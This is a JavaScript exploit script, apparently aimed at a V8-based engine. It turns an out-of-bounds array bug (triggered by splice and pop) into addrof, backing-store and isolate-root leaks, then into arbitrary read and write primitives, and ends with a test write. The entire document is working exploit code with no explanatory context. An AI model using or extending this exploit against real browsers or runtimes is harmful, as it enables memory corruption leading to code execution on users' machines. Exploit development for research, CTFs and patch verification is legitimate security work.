var buf = new ArrayBuffer(8);
var u32 = new Uint32Array(buf);
var f64 = new Float64Array(buf);

function itof(_var) {
    u32[0] = Number(_var  & 0xffffffffn);
    u32[1] = Number(_var >> 32n);
    return f64[0];
}

function ftoi(_var) {
    f64[0] = _var;
    return (BigInt(u32[0]) + (BigInt(u32[1]) << 32n))
}

function hex(_var) {
    return '0x' + _var.toString(16);
}

oob = new Array();
oob.splice(oob.length, 0, 1.1,1.1);
oob.pop()
oob.pop()
oob.pop()

var arr = [1.1,1.2,1.3,1.4]
var fake = [{}];
var float_map = ftoi(oob[4]) & 0xffffffffn; // array map
var arb = new ArrayBuffer(0x100);

console.log("[+] Array Length : " + oob.length);

function addrof(obj) {
    fake[0] = obj;
    return ftoi(oob[18]);
}

var backing_store = (ftoi(oob[47]) >> 32n) | (( ftoi(oob[48]) & 0xffffffffn ) << 32n)

var a = new Uint8Array(64); // TypedArrays with backingStores greater than
var isoalte_root = ftoi(oob[103]) & 0xffffffffn;

console.log("[+] Backing Store : " + hex(backing_store));
console.log("[+] Isolate Root : " + hex(isoalte_root));

// for(var i = 0; i < 100; i++) {
//     console.log(i, hex(ftoi(oob[i])))
// }
function read(_addr) {
    oob[47] = itof(_addr << 32n);
    oob[48] = itof(isoalte_root);
    let temp = new Float64Array(arb);
    return ftoi(temp[0]);
}

function arb_read(_addr) {
    oob[47] = itof((_addr & 0xffffffffn) << 32n);
    oob[48] = itof(_addr >> 32n);
    let temp = new Float64Array(arb);
    return ftoi(temp[0]);
}

function write(_addr, _value) {
    oob[47] = itof(_addr << 32n);
    oob[48] = itof(isoalte_root);
    let temp = new Float64Array(arb);
    temp[0] = itof(_value);
}

function arb_write(_addr, _value) {
    oob[47] = itof((_addr & 0xffffffffn) << 32n);
    oob[48] = itof(_addr >> 32n);
    let temp = new Float64Array(arb);
    temp[0] = itof(_value);
}

a_addr = addrof(a) >> 32n;
console.log("[+] Arbitrary Write 0xdeadbeefcafebabe");
write(a_addr + 0x100n -1n, 0xdeadbeefcafebaben);
console.log("[+] Arbitrary Read ");
console.log(hex(read(a_addr + 0x100n -1n)));

// arbitrary address read / write primitive done
